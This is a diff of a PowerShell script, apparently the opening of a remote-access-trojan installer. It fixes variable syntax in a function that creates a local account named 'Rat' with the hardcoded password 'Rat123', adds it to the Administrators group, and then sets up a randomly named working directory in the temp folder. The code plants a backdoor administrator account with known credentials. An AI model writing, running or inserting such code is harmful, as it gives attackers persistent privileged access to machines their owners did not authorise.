@@ -10,30 +10,29 @@ function random_text {
 function Create-NewLocalAdmin {
     [CmdletBinding()]
     param (
-        [string] uname,
-        [securestring] pword
+        [string] $NewLocalAdmin,
+        [securestring] $Password
     )
     begin {
     }
     process {
-        New-LocalUser "uname" -Password pword -FullName "uname" -Description "Temporary local admin"
-        Write-Verbose "uname local user created"
-        Add-LocalGroupMember -LocalGroupMember "Administrators" -Member "uname"
-        Write-Verbose "uname added to the local administrator group"
+        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
+        Write-Verbose "$NewLocalAdmin local user created"
+        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
+        Write-Verbose "$NewLocalAdmin added to the local administrator group"
     }
     end {     
     }
 }
-# create admin user
-uname = "Rat"
-pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
-Create-NewLocalAdmin -NewLocalAdmin uname -Password pword
+#name and pass
+$NewLocalAdmin = "Rat"
+$Password = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
+Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 #variable
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
-
 
 # go to temp, make working directory
 mkdir $path
